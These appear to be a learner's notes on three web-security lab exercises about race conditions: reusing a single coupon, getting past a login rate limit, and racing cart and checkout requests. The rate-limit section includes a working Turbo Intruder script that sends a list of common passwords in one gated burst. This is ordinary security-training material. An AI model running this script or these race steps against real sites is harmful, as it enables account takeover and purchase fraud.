# LAB : ## Limit overrun race condition

Goal : We have to buy a jacket using low money. 

Approch : there is a gift card coupan and when we purchase jacket we can use that coupan code that is valid for one go. 
capture that request send it to Repater add group duplicate request and send those request parallely we get the  multiple coupan appliied at same time and that is same coupan. 

---

# Bypassing rate limits via race conditions
goal : login as  a carlos and delete it but we have to login thorugh a rate limit but we cananot do that it getting blocked

Approch : 

1) so first i send to intruder add positions to payload it was a new request and setting the custom resource pool to send 30 request at the same time but it wont work 
2)  on the second we use turbo intruder but it wont work either not getting proper response 
3) use the repeter group funcitonality and send paralley single still it wont work 

WHY IT WONT WORK ??  --> i guess i am not able to send the packets in the rate limit winodow or not able to bypass the rate limit 

```bash

def queueRequests(target, wordlists):

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    passwords = [
        "123123", "abc123", "football", "monkey", "letmein",
        "shadow", "master", "666666", "qwertyuiop", "123321",
        "mustang", "123456", "password", "12345678", "qwerty",
        "123456789", "12345", "1234", "111111", "1234567",
        "dragon", "1234567890", "michael", "x654321", "superman",
        "1qaz2wsx", "baseball", "7777777", "121212", "000000"
    ]

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

use this script for the trubo intruder and it worked. 

---

# Multi-endpoint race conditions

Goal : to buy a Leather Jacket using race condition 

Approch : we can easily say that the race condition will happening on the gift card and coupan side which will be easy. 

so first see the POST /cart and POST /cartcheckout request create a group in the repater and send request single connection 
later add a gift card to the card and send the id 
later change the id to the lether jacket and we can see insufficeint fund so remove the jacket from the cart in the url and add a giftcard but on the backend the id is still there so later send both rquest parallely and we solved the lab 

----

